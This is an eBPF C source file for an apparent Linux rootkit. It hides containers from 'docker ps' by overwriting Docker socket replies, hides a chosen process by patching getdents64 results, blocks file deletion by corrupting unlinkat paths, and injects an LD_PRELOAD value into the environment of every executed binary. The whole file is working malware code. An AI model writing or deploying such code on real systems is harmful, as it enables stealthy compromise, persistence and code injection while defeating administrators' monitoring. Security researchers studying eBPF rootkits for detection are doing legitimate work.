#include "vmlinux.h"
#include "shadow.h"

#include <bpf/bpf_tracing.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>

/* 
 * ##############################
 * HIDE CONTAINERS FROM DOCKER PS
 * ##############################
 */

/* ringbuffer map to let userspace know when we've overwritten data */
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, MAX_ENTRIES);
} rb SEC(".maps");

/* map holding programs for tail calls */
struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 5);
    __type(key, __u32);
    __type(value, __u32);
} map_prog_array_fentry SEC(".maps");

/* map holding iov_data struct to pass between tail calls */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, MAX_ENTRIES);
    __type(key, __u32);
    __type(value, struct iov_data);
} map_iov_sendmsg_data SEC(".maps");

static int cmp_sun_path(const char *sun_path)
{
    static const char path[] = "/run/docker.sock";
    if (!bpf_strncmp(sun_path, sizeof(path), &path)) { 
        /* match */
        return 1;
    }
    return 0;
}

static int is_docker_sock(struct socket *sock)
{
    /* read sun_path */
    char sun_path[UNIX_PATH_MAX] = { 0 };
    struct unix_sock *us = (struct unix_sock *)BPF_CORE_READ(sock, sk);
    char *addr = (char *)BPF_CORE_READ(us, addr);
    bpf_probe_read_kernel(&sun_path, UNIX_PATH_MAX, addr + SOCK_PATH_OFFSET); 

    /* check if sun_path is /run/docker.sock */    
    if (!cmp_sun_path(&sun_path)) {
        /* no match */
        return 0; 
    }   
    /* match */
    return 1;
}

/*
Inspect container:
'docker ps' : GET /v1.47/containers/json
'docker ps -a' :  GET /v1.47/containers/json?all=1
'docker inspect crazy_mclean' : GET /v1.47/containers/crazy_mclean/json
'docker ps -n 1' : GET /v1.47/containers/json?limit=1 => show lastest contianer, same as 'docker ps -l'

Create container:
'docker run --rm -it alpine' : POST /v1.47/containers/create

Pull container:
'docker pull alpine' : POST /v1.47/images/create?fromImage=alpine&tag=latest
'docker image pull myregistry.local:5000/testing/test-image' : POST /v1.47/images/create?fromImage=myregistry.local%3A5000%2Ftesting%2Ftest-image&tag=latest

Kill container:
'docker kill crazy_mclean' : POST /v1.47/containers/crazy_mclean/kill
*/

const volatile char hide_docker_ps;

SEC("fentry/unix_stream_sendmsg")
int BPF_PROG(unix_stream_sendmsg, struct socket *sock, struct msghdr *msg,
			        size_t len, int ret)
// int unix_stream_sendmsg(struct pt_regs *ctx)
{
    if (!hide_docker_ps)
        return 0;

    size_t pid_tgid = bpf_get_current_pid_tgid();

    /* exit if socket is not /run/docker.sock */
    if (!is_docker_sock(sock))
        return 0;

    /* docker seems to only use ITER_UBUF so just read __ubuf_iovec */
    struct iov_data data = {
        .len = BPF_CORE_READ(msg, msg_iter.__ubuf_iovec.iov_len), /* msg->msg_iter.__ubuf_iovec.iov_len */
        .base = BPF_CORE_READ(msg, msg_iter.__ubuf_iovec.iov_base), /* msg->msg_iter.__ubuf_iovec.iov_base */
        .body_start = NULL,
    };

    if ((s64)data.len <= 0 || data.len >= BPF_MAX_VAR_SIZ)
        return 0;

    bpf_map_update_elem(&map_iov_sendmsg_data, &pid_tgid, &data, BPF_ANY); /* save for later :^) */
    // bpf_printk("RECEIVED LEN: %d", data.len);
    // bpf_printk("RECEIVED DATA: %s", data.base);

    bpf_tail_call(ctx, &map_prog_array_fentry, PROG_01);
    return 0;
}

// PROG_01
SEC("fexit/unix_stream_sendmsg")
int http_find_msg_body_start(void *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    struct iov_data *data = bpf_map_lookup_elem(&map_iov_sendmsg_data, &pid_tgid);
    if (!data)
        return 0;

    char local_buf[LOCAL_BUF_SIZE] = { 0 };
    void *saved_base = data->base;
    /* loop and find the potential start of our message body */
    for (u32 i = 0; i < LOOP_SIZE; i++) {
        bpf_probe_read(&local_buf, sizeof(local_buf), data->base);
        for (u32 j = 0; j < LOCAL_BUF_SIZE; j++) { 
            if (local_buf[j] == '[') {
                data->body_start = data->base + j;
                data->base = saved_base;
                goto out;
            }
        }
        data->base += LOCAL_BUF_SIZE;
    }
    /* return if we haven't found anything */
    return 0;

out:
    /* 
     * if we find double brackets [] or a quote after a bracket [" then return because 
     * we either have no message body or are in the middle of the message
     */
    bpf_probe_read(&local_buf, sizeof(local_buf), data->body_start);
    if (local_buf[0] == '[' && (local_buf[1] == ']' || local_buf[1] == '"'))
        return 0;
    
    /* overwrite msg body with nothing ;) */
    static const char empty_body[] = "[]";
    long ret = bpf_probe_write_user(data->body_start, &empty_body, sizeof(empty_body));

    /* send event */
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0); /* reserve the sizeof our event */
    if (e) {
        e->success = (ret == 0);
        bpf_ringbuf_submit(e, 0);
    }

    /* clean up the map since we're done */
    bpf_map_delete_elem(&map_iov_sendmsg_data, &pid_tgid);

    return 0;
}
 
/* 
 * ########
 * HIDE PID
 * ########
 * Pulled from: https://github.com/eunomia-bpf/bpf-developer-tutorial/blob/main/src/24-hide/pidhide.bpf.c
 */

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_dents SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, int);
} map_bytes_read SEC(".maps");

/* map with address of actual buf to patch */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_to_patch SEC(".maps");

/* map holding programs for tail calls */
struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 10);
    __type(key, __u32);
    __type(value, __u32);
} map_prog_array_tp_syscall SEC(".maps");

const volatile int pid_to_hide_len = 0;
const volatile char pid_to_hide[MAX_PID_LEN] = { 0 };

/* need to hook entry as well to capture dents from args[1] as args doesn't exist for sys_exit_getdents64 */
SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    struct linux_dirent64 *dirp = (struct linux_dirent64*)ctx->args[1];
    bpf_map_update_elem(&map_dents, &pid_tgid, &dirp, BPF_ANY);
    return 0;
}

// PROG_03
SEC("tracepoint/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();

    /* if bytes read is 0 then everything's been read */
    int total_bytes_read = ctx->ret;
    if (total_bytes_read <= 0)
        return 0;

    long unsigned int *pbuf_addr = bpf_map_lookup_elem(&map_dents, &pid_tgid);
    if (!pbuf_addr)
        return 0;
    
    long unsigned int buf_addr = *pbuf_addr;
    struct linux_dirent64 *dirp = NULL;
    short unsigned int d_reclen = 0;
    char filename[MAX_PID_LEN] = { 0 };

    unsigned int bpos = 0;
    unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
    if (pBPOS != 0)
        bpos = *pBPOS;

    for (int i = 0; i < 200; i++) {
        if (bpos >= total_bytes_read) break;
        dirp = (struct linux_dirent64*)(buf_addr + bpos);
        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
        bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);   

        int j = 0;
        for (j = 0; j < pid_to_hide_len; j++) {
            if (filename[j] != pid_to_hide[j]) break;
        }
        if (j == pid_to_hide_len) {
            bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
            bpf_map_delete_elem(&map_dents, &pid_tgid);
            bpf_tail_call(ctx, &map_prog_array_tp_syscall, PROG_04);
        }
        bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
        bpos += d_reclen;
    }

    if (bpos < total_bytes_read) {
        bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
        bpf_tail_call(ctx, &map_prog_array_tp_syscall, PROG_03);
    }
    bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
    bpf_map_delete_elem(&map_dents, &pid_tgid);

    return 0;
}

// PROG_04
SEC("tracepoint/syscalls/sys_exit_getdents64")
int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
{
    // Only patch if we've already checked and found our pid's folder to hide
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int *pbuf_addr = bpf_map_lookup_elem(&map_to_patch, &pid_tgid);
    if (!pbuf_addr)
        return 0;

    // Unlink target, by reading in previous linux_dirent64 struct,
    // and setting it's d_reclen to cover itself and our target.
    // This will make the program skip over our folder.
    long unsigned int buf_addr = *pbuf_addr;
    struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)buf_addr;
    short unsigned int d_reclen_previous = 0;
    bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);

    struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buf_addr + d_reclen_previous);
    short unsigned int d_reclen = 0;
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);

    // Attempt to overwrite
    short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
    long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));

    /* send event */
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0); /* reserve the sizeof our event */
    if (e) {
        e->success = (ret == 0);
        bpf_ringbuf_submit(e, 0);
    }

    bpf_map_delete_elem(&map_to_patch, &pid_tgid);
    return 0;
}

/*
 * #####
 * NO RM
 * #####
 */

SEC("tracepoint/syscalls/sys_enter_unlinkat")
int tracepoint__syscalls__sys_enter_unlinkat(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    static const char replace[] = "nope";
    bpf_probe_write_user((char*)ctx->args[1], &replace, sizeof(replace));
    return 0;
}

/* #######################
 * LD_PRELOAD every binary
 * #######################
 */

const volatile char ld_preload[LD_PRELOAD_MAX_LEN];

SEC("tracepoint/syscalls/sys_enter_execve")
int tracepoint__syscalls__sys_enter_execve(struct trace_event_raw_sys_enter *ctx)
{   
    bpf_printk("FILENAME: %s", ctx->args[0]);
    bpf_printk("ARGV: 0x%lx", ctx->args[1]);
    bpf_printk("ENVP: 0x%lx", ctx->args[2]);

    char **envp_dbl_ptr = (char**)BPF_CORE_READ(ctx, args[2]); /* ctx->args[2] */
    char *envp_ptr = NULL;
	
    bpf_probe_read_user(&envp_ptr, sizeof(unsigned long), envp_dbl_ptr);
    bpf_probe_write_user(envp_ptr, &ld_preload, sizeof(ld_preload));

    return 0;
}

char _license[] SEC("license") = "GPL";